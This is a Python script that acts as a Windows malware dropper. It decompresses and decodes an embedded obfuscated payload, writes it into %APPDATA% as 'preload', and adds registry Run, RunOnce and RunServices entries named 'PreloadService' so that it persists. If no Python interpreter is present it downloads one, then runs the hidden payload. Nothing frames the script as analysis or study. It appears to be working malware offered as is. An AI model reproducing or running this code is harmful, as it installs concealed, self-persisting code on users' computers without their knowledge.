import sys,os,re,base64,threading,time,zlib

payload = 'x\x9c\xed[Q\x9b\xa2\xb8\x12\xfdK\x80\xed~\xcb\xc3>\x08-\x08*\xd3B\x13 o\x06z\x01\r\xea\x1dD\xd4_\x7f+\x01\x15[\xa5\xd9\x99\xee\xb9\xbb\xfb\xdd\x07\xbf\xc1\x16\x92T\xd5\xa9S\xa7Bf\xee\x89%\xe9\x99\x821\xb2\xc4`\xa5\x1c\x88d\xd1\xb07\xcd\r]>NT\xe5\xf8\xe6\xc3\xf5\xc8\xde\x10\xcfe\xff\xae\xc3\x0c%X\xa7\x05>\x94q(\xd1\x15\xc9\xb4\x9c\xddG|\xbb$:M\xe1\xfa\x10x\xfd%\x91\x04\x18\x03\x17\xc4\xd3\x84@\x8a\xc7xe\xee\x88\x03\xf7I\xd6w\xec\xcf\xe2\xf9i^u}\xfaM\x98\x8fL\x1ax0W\x16^~\xd7\xea9\xd52F:\xddb\xdf\x18\xabY\xb2\x0b{\xb3\xf8\xc5\x19\xa4\xd3\xd7\xa90Y\x18\xe57\xe7I\xb2\xe03M\x8dq\xa8\xcb\x87H\x1d\xc8\xc6\xb3+Y\xc7x\xac\x82]s\xaf\x0fs\x99\xcfD\xea\x17\xd8\xb3\x04\xf8\xbe\x02{v\x86j\xe4s\xb05R\xcbt\x06\xd7\xfc\xd9\xc1\x1a\xc6\xd8\'\x91\x8ewa&\xf0y"\x89\x16F\xaalpz\xb9&)\xf7O\xd1\xbc\x17{\xfb#\x86\xfb\xc1\x17E\xe4\xc7\xa9\x1ao\x16D\xd7\x8e\xe1AQ\xe0\xdf\x03q\x12\xedM\x07\x1f3\x9fJO\x9bo\xf1:6\xd4A\x1c\xb2{\xca\xcd\x12{A<\x97hN4\xb9\x0c3y1\x1e\r\xce\xf7\x90\xde\xb4\xe0\xbf\xa9I9Y\xc1Z\xd4\xfdq\xeeEE\xe0\x95\x85+\xd0\x11\x1a"\xe7\xd5Y\x8e\xb1\x8e2c\xc4bi\x8bAo\xb6\x1eg\xda\x01\xb3\x98\xaa\xeb\xff\xcc{\xd12<,\x7fS\xd3\x01\x8c\xa9\x94D\x92\xf3\xf0\x00\xbe\xd2\xc5$T\x13!\xf2\x95\x1c;e\x1c\xf8\xe6\n\xee\x8b\xc7\xa9\xf2=\x92\xec\xe3$\x8bh\xa4\xc6+\x88E\x89!\xa6&\xc4\x7f\ns\xb1u\x19\x10\xb7\xb0\x87r\xeesmK|$T\x7fg>I\xab9\x0c\xf0\x07\xaciG\xa4\xfd\xf1d\xcf\x9dg\x9f\xc6\xe2\xb6\xef;JFzF\xfc\xa6r\x1f\x1f\xb0o\x89d4\x8bq&\x1f\x8c\xd1\x12\xb0\xf1\x04\xfe\x92wD\xbb\x9e\x07\xfc\xb5\xac\xe6\xa9\xc7|^\x8f\xcf\xf3\xa8J\x7f\xee\xa1\x1c\xabJmc\xc2\xef\x1f\x83{*\x7f\xc13:J"5\xd9\x05\xd9\x86\x82\xdfj\xdc\xa3\xe3\x8b\xdb\xdf\x91\xcc=\xc7a\x0e1\x8a8\x16\xa7\xf1\x1c>\xaf\x99\\\xe0\xd7\xab\xb9zs\x9d\xc2\x1c\x8a\x1b\xae\x10\xbd\xb2\xf7z-\xa7\xb9j;P\x1eJn\x1d\x9b\xea\xc3m\xd6+\x9b\xdfFfB \x0e\xe3z]\xe3\xab9\xab\xcf\x9bG)\xd1g1\x91\xcc\xff0\x9c\xab+\x9b\x12_\x01lj\x877\x07|\xac\x1a\x0c\x93\x1cg\xa1\x04k\xa0\x10O]\x13\xc0\x1fb\x98\x95w\xf1\x883\xc8wM\xce\xe6\xde\x9e\x86\x87d9\xf7!O{\xf6.\\-\xc1GJ\x12\x8dl\x1af\x17,Wq\x82\x9cf>\xd4\xedM\xb8b|\x827DGG\x1e\x1f\xc6-\xab(!z\xbe\x06.9\xb0uB\xae\xf7\xaf\xed\xa90\x10d\xda\x11{\xfd\x04\xf8\x87\xfb\x00\xd6\x92\x83\xdf\xaf|T\xf9\x8ef\r\xbe)p\xd6\xdf\x06\xbe\xbd\x98\xabI\x1a\xf8\x16\x05\x9e\xda2\\\x83]B\xa4\xa3\x03I\x97\xb7c\xd4\xf32;\xab\xfbY^\xb0\xb5\x82\x8dz\\\xcc3\x19\xf0\x98@^\xc9\x02\xf0\\c\xdc\xe5M\x1c*l\xd3\r\xf0\xc1\xb2\xb6\x1d\xf2T\xa4\'\xdf\x03\xe6\xd2\xc0\x03.\x04\x1c\x87i"\xccu\x04~5\xee\xfa?\x944\t#%\x01^^\xf3\xbf\xf7"\x88\xe7\xec~\xac$1\x81\xf5\xa7\x80;\x01{\x8c\x93,:\xd6\xd16\xf0(\xe3\xe9\x05\x91\xc4\x14\xb8\x0f\xec\xa1;\x92\x961\xf1h\x01\\+\x12\x87]kO\xd5\xf5\x85\x1f\xc0\xc6\xa3\x9a\xd9\x14\xa7\xca"\xf2!N\xf0\xfc\xf5\xd8\xda\x12\xf3|cu\x02p\xb6b1\xff\xd9\xf9\xac\x9c\xfdk\x8c\xd02\x1c\xe2\x1c\xfc\xbd\x1c_\xd5\x9e\xbe[\xd5\x8a\x1b\x1f\x9c\xb8V\x08z\x8aN\xc0\xb7\x188\xadQW\n\xa4\'\x807my\xc6\xda\x88\xfb\xb5\xe6\x00\x98OC\x05\xc4*\x01\x0c\xad\xa3\x8c.X\x9e\xcf\xfd\x01\xd8\x867\x80\xf9\r\xcf\xa5\xd5}\xdfG\xbaU"\xaf\x9f\xc3\xf8\x0cw\xd2\x9c\xd7\x19q\x13B\xed:\x8dU\xd5\xa6\xbb\xfee>+\xc6:\xafm\'_^\xe6\x19\x99\x1b\xb2\x9a\xc5\x06\xb5\x04\xe0\xe6\xaa~\xe9,\xd6Oi=V\xcd9\x83\xfd\x15\xdf\xe8\x16pW\x9f\xe5+\xc5\x8cc\x878!#\x8b6\xb1\x1fI\t\xe0\xd3\x8d\xa7w\xf8\xe4\xf4\xdb\xf8\xdd8/\x8e\xa2\x07\xbc\xd6=\xcc#\x01\xf8\xe1\xc1o\xd5\'<\x8a\'=\xb0\x9e\xb9\xf8O\xc7\xedk\x08|\xe5\n\xf2\xb3#\xca\xafH3\xb5\x99+lZ\xc78\xf4\x17\xa7\x9a>V\x935\xe9Y\xc2\xa4\xf6\x1dp\xfb\xc3\xe7X}\xac5\x01\x81y\xf5WQ\x88g\x92\\\x90\x0cA\x9c\xd0\x92k\x83t_\x8d\xa7\x9a\x03\xb8\xe6z\xa4m-A\xf3\xf9g!F#S\xc4\x0f\xd6\x80\xfdd\x81}E\xb8\xad\r\xcd5r\xddU\x84\xd2\x9eb\x7f\xb0\xb6\x80gn\xe6\x1f\xd9\x87\xb7;q\xabb/\x1e1\xf8x\xb2b|\x1d\xac\xa7\x8b\x81\xf0\xedy\xf0\xc0\x9f\xac~\x82fQ\x07\xa9\x9bi=c(BN[\t\x96\\\xa6\xe9\xb6\xa1\x14>\x98C\xcb!\xcf2\xec1\x9d\xc4\xef+\xc2\x9e\x92\xcf!\xa6\xc6"O\x1f\xc5\xa0\xaakP7=\xb3\x0f\xf1\xa3U]8\x8f\xf5\x9b\xa1Z.\xe0\x198\x80\xee"\xdf\x88\xe7\xbaV\x86P\xfb\xa1V\xf5\xf9s\x0e\xcc\xe1\xf5)\xd4\x96\xfb\xeb\xaalb\xfc\xb3ez\xb4\xd28\x97\xf9&+\x8b\xe9U\xc0\xcc#\x7f\x0c\xde\xe5\x9d)\x02\xfe\xb96\x05\x9cl\x81\xbb\n\x0cz18]\x8fZ\xd7\xc1t\xe3\xfar\xafE\xa6\x1a\xf8\xebU\x88\x8d\xccZ\x1a\x0fkQ\xd3\xcfP\x872\x8b\xd7K\x9e\x8b\x9e\x08Z\xc0>zG-j\xc5y5?`\x80\xd5\xaa\xd9\x9aiH,!\xe0\xc7\x08\xc0\xb4l\xb5\xfdq\x9e$\\\x87\x80~a5\x0bx\xef\xf7\xd8\xf4Ay\xabn\xfcn\xfc6\x9f\x80N\x81\x9a\xad&\x97\x18\x89y\xe9;\x8c[\x06)\xd7&\xabZ\x9bx\x80\x0b\xf5R\x1b[\xc6\xfc\x90s\x9a>\x81\xda\x9c!_Y\x82N\xa0?\xe0SZ\xe9\xf8Y\xe7\xf9N10\xe8\xf6\xf9uH\xb5WjG\x86\x16\x81\x9e\x00.\x1f2\x8d\x8e\xb6\xa0u\x04\xa8_L\xcf\x9ad\x05\\\xad\xd3\xa5\xa1\x81\xae\x87\xbc\xec\xb0&\xd0\xca6\xe8\xb8\xa7J\x93\xb6\xdd\x0fZ\x93\xe9\xd8k\xbb\x95\x08x\x0b4\xa2y\xc4\xbe\xd9\xd0\'\x9f\xee{\xa8\x97&\xd4\xd8-\xf4\x89\xf2\x0f\xe0\xb9\xce\xcdC\x9fiC\xc0\x99If\xc2\xde\xb4\xdd\xbe\x0b\xbd\x83z^w\x86Xn\xb5`\xb0\xe6\xa2.\\\xfc\xf1\xbc~\xc8|~\x00=\x91E"\xe8\xf3"\x1aM\xdbc\xd6\x1e\x83\x03i\xf8\xa8\x13G\xb4\xd5\x82\x9b{\xcd-h\xeb\xc5\\\xb2A\xa7\x1b\xd7\xdc\x84\xdak\xee\x87\x98\x1e\x8a\x0c\xb7\x8b\xb9\'\x8b\x80\xe5\x99\xa3\r\x18g.\x81\xb3\x1d\xec\x89\xbb\xe8\x9f\x1d\x17\x11\x8f\xa07\xe1\xda\xf2\xd3\xf3\x82\x8d\r5\x06\xef\x98~x\x17\x93F]]w\xe0\x82\xeaS\xf5\xd5\xa7=\x94\xe4\x1b\xaf}\xd7:7\xe7\\\xe1\x94\xeb\xc8\xb3K\xe0\xfa\x8cp\x1e\x06\xcdz\xf9\xbe\xf7\x9d\x0e\xb5\xa2\xb6\x170\xc15j;\xff7\xb18\x05\x8d\x83\xa0\x9e\xc6\xa9\'XS\xc7E\xdf\x10\xd4G;\xdb\xef\x88T\xed\x07\x85=;\tWL{\x1a\x1f\xafCGO\x81\x84\xca\xeb\xfe\xffG\xe6\xd7X\xdfVi\xc1Qe\x93Q\xf7#\\\x7fw\xc0p5~\xd5c\xb4\xf8\xac\xb5\x16\xb28\xe0\xca\x17\x90Wez\xaf\xef\xbf\x89\xfb\xc8\xecw\xcd\x9bs\x9c\xb9F\xba\xe6\xe2\x8bN2~\xebn/\xdb\x9bSN=\xda\xba\xc2\xd7\x9ea\x1b\x91l\x0f\x7f\xb3\xd6\x93!\xdfS\xc9\xc7\x0c\x8b\xac\xa7\xcbd\xa6\x89r\xa3\xf9\x1dx\xa8;\xce\xfb\xc7H\xd7\xa0\xb7\x8a\xbf\x00\x1f?\x19?\xe8\x0b\xab\xf8\xcd>?v0\xf6/\x88\x1d\xeb\xa7\xef\xc4\xce^\\\xc7\xae\xf1\xfd\xabbW\xf9\xbbYw\xcc\xd7%~\x01\x9e\xaf\xfa}\xbe?\xa0T\xe3\xe9__gld:\xaf\xa2\x19\xb1\xbe\x9a\xed\x1b\xb1\xfdEr\x9a_m\xae\xa9\x03oU\xb6U{\x02-\xf7\x82n}\xdcO\xacX\x0c*\x8e\x82\xfe<\xff|\xddp\x8a\xf1\xef\x0c\'M\xbcC\x8d\xe8\x1fC}\xbf\x818\xa6\xdf\xd2\xce\xf6\n\xbcW>\xed\xcb\xd4\xd8\xba\xdeK\xd9WuKM\x18\x0ey}d\xf5\x18\xfa\xd2\xc6w\xd0\x8d\x8f\xf6\xe1n1^T\xf5d\xb6\xfe\x02\x9d\xffs\xf1\xcb"\xbew\x16\xacL\x11\xf0\x9b\x91\x9e\xb9\xc0\xce\xa7\xeb\x8cz\x0f\xef\xeb\xe3xo?\xf2\xcc\x1f\xbay\x88\xa0\xf7jj\x8e\xda\xeesL\'Wk\x05^\xa1\xec\xbd\xd2\xd5s\xc7\xff\x856\x995\xe2S\xbdK\xaa\xf5\xc1?W\xd7\x82\xb6\xc4\xf4\xdf\x82\xbb\xa0\x87\x80\x83\xe5\xed\xb5=\'\x1e\x89\xd3P\x12\x85P\xeds\x9b\'\x19\xf8\xc31r\xe3\xd9}\xb2\x0e\xef1\xa8\xdcb\x10\xdd`\xf0p\x8b]\xeb\x8b\xf8\xa8\x15\x13j#\xcfnt\xf3\xbdq~\x95\x96F=s\xc7\xd6\xc3\xde+F\x9eH\xc9\xca>\xb6\xe7J\xbb\xa6z\xf3\xb45\xd4\xb8+^\xf9\xf4Z\xd7\x8c\xf1\xd7\xea\xab\xbb\xefV\xce<\xa9\x9a\xfc\xfd\xfa$c\\Z\x16\x95\xed\xbf\x17\xac~\x18i\x19[\xafq\xef\x06\xa3\xda\rF\xf7\xb7\x185o\xb1-\xfe2\xdd\xd6\xd8/\xa8\xd6\xc9\xf6\x84\x03\xa9\xa9\xdf\xdct\xec\xdc\x19g\xf0\x8b\xf7\xe6\xf4\xe6\xde\\;/\xb5\xd7vmG\xf4\xa6\xad\xee\xa7\xf7\x03\xcd\xf8~\xe9\x1e\x82n\x89\xc0-\x90\x0fW\xf6\x9c\xf7\x12\x8c\x95\xb5\x8dF\x83"\xf0\xe4\xfc\xff\xfc\xda\xc61\x7fO~\xbd_?\xff\x11z \xc1\xba\xcd\xce\x8c\xb0\xf3K\xfc\x9d\xdd\x84\xd9\xeai\x1b\xa2\x96<\x1f\x82\x8c\x16\x81\xcf\xcf\xdf\x00\xceD\x88#\xddF\x1e\xc3\x9c\x98\xbc\xe9\xfc\xfa\xce\xbb\xac\xaf\xcd\x97\xcf\xca\x89\xf7\xcfY\xb7u@\xfc;\xe9e\xec\xcd\xfee\x1c\x9f@^\xedwQo\xba\x9f.\xa6\x9d\xf8\xfd\xcc5\xfc\x1d_D\xa1\xf7\xed\x81\xff\xda\xebp\xbb\x96\xdfG\x1e\x15\xba\xe9\xa1)\xe8\x88\xfd.\x94\xdc.\xbd\xf0\xf9\x1d\xb1\'\xd0o\xf6R\x86\xda}>\x17\xc0\xf2)\x9e\xf1\xb1\xd0\xd2\xf8\x98\'R\x96\x1f\xf3\xb2\xdd\xc6\xf7\xe7\xa1\xee\xdb`\xaf\xb1w\xf2\x03?\x17\xb82\xd4\xf0t^\xa7\xf1\x0e\xf8c\x0c\xdfy\xdf\x9bN\x1a>\x9e\xa8\xc0\xb3\xa9\xe2\x04~\x18\xbb\x12\x8bu\x99~\xcc\xf1\xecy\xce)\xc7\xc83\xf9\xb9>\xceOT\xd9\x85:*\xc6\xd7\xeb\xcf!7\xe0\xfb>\x7fA\xf6!\xe2\xe7.-\x01\xeb\xb2\x18=\x8b\xef\x9f7\xdd\xe1\xe9wt\x08\x17m\xbf\xd3\xe2\xc5\xbf:\xe3Y\xb8C:\xb3\xbb\xd4\xd0\x9e\xb5\xc1R?!\xa0\xf7\xea\xf3\x86\xeb\xf3\xd9Oj\x99\xb6\xa0Mg\xc8\xb4\x80{\x12~\xc6\x11\xc9k~\x06\x14\xd6\xd4\x813\x17\xe7\xb1\xe0\x03\x9c\xb0\x1d?OKv.\xef\xa3u\xd5<\xcb\xce\xc2\x1d\xd830\xff\xf79\xf8\xcd\xef1\x1b\xa79?\xc3x\x14\t\xcf\xd3.\xef\xb4\xfe\xda\xbe\xd0_\xa9s\xafhh\xbf \x04\xb1\xd5,\xd7\x1e"\xc7MO\xfd\x84\xc0u<\xf1Q1\xf7\xac\x044og\x8d\x02\x9c\xf1\xa7+\xdaC\xb6\x07\xc9\xb5\xde\x8a\xb2w\xe5\x870\xd3\xfa\xe3\xf3<\x1dy\x1bp\xe8\x8b\xec\x19\x19!\xe6W\xdd\xec\x03_\x83/\xcc\xe4\xcdIN\xeb\xef\xbc\x87y\xe2\t[\x90\xdd\xcaf6\xae\x91\x9f\xaf?\xe4\xf7w\xf9\xb8\x8c^P\xe5G\xcd\x85Nor\xb9\xeeh\x1f\xd7:\x94P\xf9\xf4\\\xc5\xd7\x9d\xdem?\x1c\x87\xf9$6~d\x9c+?)\xcd\xf1\xba\xd9\xd3\xf4\xd1\xb9~4c\xd81\xee\xd5:(;\x13\xf6\x03\xeb\x7f\xd0\xcf]\xb8\xd8\xf6\x13\xa8\r\xa8\xaa\xf3\x9dq\xbd?\xe2\xae=\xfa}?v\xc7\xc5;;\x9a9\xf5\x05{\xc3\xbc\x16MV\xec\xbc,\xd3\x9d\xec\xdcm\xe7\xde\xb9z6\xdbn\xa0\xe6\xfcd\x1f38N!\x7fx\xcd\x81\x9af\x0cy\x0fB1{_\xa2\n\xb1\xdbC\xa9;2w\xf07v\x96r\xc28\xf5\xa1NS\x07\x7f\xa5~T\xf5\xc1\x89\xcb\xdb\xf5\x9f}\x19;\x12\xea\x07\x99\x9c\x84\x99m\x12\xe6+\xd0\x8e\x8f}\xac\xb0sQ9\xe9Y\xf4\xa1Fm=\xeb\xc7\xce\xa5*\xcf\x04\xb4\x17\xb3\xf1\xc1\x1c\x0f\xb4\xcae\xcdv\xbd\xa7;\xf7dv\x8e\xedh\xe8\x8ftKSC\x01?/e\x07\xe2\x01\x1a\xc3}\xb0\xf6\x8f\xf5\xd9E\xb3\x9c\xdf\x855\xfe\x9f\x03\xacgX\xf9\x07z\xd4\x07g\xf8L\xb6w\xfa\x1d$\xe7\xcd\x19\xd2\x9b\xbd\x87\xea\xcc\xe9\xba\xfe?\x13q}\x9e\xf5t~\xfdN/\xcb|"\xb2\xf3v\x80!T\x8e\x9f\xdd\x8d\x1a\xff\xf1\xc7\x7f\x01\t\xbat\xa9'

valid=""
dest=""
if "win" in sys.platform:
    done = os.path.exists(os.path.join(os.path.expandvars("%APPDATA%"),"preload.exe")) or os.path.exists(os.path.join(os.path.expandvars("%APPDATA%"),"preload.py"))
    while not done:
        try:
            if hasattr(sys, 'frozen'):
                dest=os.path.join(os.path.expandvars("%APPDATA%"),"preload.exe")
                os.system("copy "+sys.executable+" "+dest)
                reg_list = [
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PreloadService /t REG_SZ /d "'+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PreloadService /t REG_SZ /d "'+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v PreloadService /t REG_SZ /d "'+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v PreloadService /t REG_SZ /d "'+dest+'" /f'
                ]
            else:
                paths = [
                        "",
                        "C:\\",
                        os.path.expandvars("%ProgramFiles%"),
                        os.path.expandvars("%ProgramFiles(x86)%"),
                        os.path.expandvars("%LocalAppData%\Programs"),
                        os.path.expandvars("%APPDATA%")
                    ]                
                def look_for_python(name,dirname,fnames):
                    for fname in fnames:
                        if re.match("(py|python).*exe$",fname):                
                            if os.system(os.path.join(dirname,fname)+" -V") == 0:
                                global valid
                                valid = os.path.join(dirname,fname)
                                return                    
                for path in paths:
                    try:
                        for name in os.listdir(path):
                            if os.path.isdir(os.path.join(path,name)) and name.lower().startswith("python"):
                                possible = os.path.join(path,name)
                                os.path.walk(possible,look_for_python,None)
                                if not valid=="":
                                    break
                    except Exception as e:
                        print e
                        pass
                if valid == "":
                    try:
                        import urllib
                        urllib.urlretrieve("https://github.com/manthey/pyexe/releases/download/v18/py27.exe",os.path.join(os.path.expandvars("%APPDATA%"),"python.exe"))
                    except:
                        import urllib.request
                        urllib.request.urlretrieve("https://github.com/manthey/pyexe/releases/download/v18/py36.exe",os.path.join(os.path.expandvars("%APPDATA%"),"python.exe"))
                    valid=os.path.join(os.path.expandvars("%APPDATA%"),"python.exe")

                dest=os.path.join(os.path.expandvars("%APPDATA%"),"preload.py")
                print os.path.realpath(__file__)
                with open(dest,"w") as f:
                    f.write(base64.b64decode(zlib.decompress(payload)))
                reg_list = [
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PreloadService /t REG_SZ /d "'+valid+" "+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PreloadService /t REG_SZ /d "'+valid+" "+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v PreloadService /t REG_SZ /d "'+valid+" "+dest+'" /f',
                    'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v PreloadService /t REG_SZ /d "'+valid+" "+dest+'" /f'
                ]
            [os.system(i)for i in reg_list]
            done = True
        except Exception as e:
            print e
            pass
else:
    #do for linux too
    pass
if hasattr(sys, 'frozen'):
    exec(base64.b64decode(zlib.decompress(payload)))
else:
    os.system(valid+" "+dest)
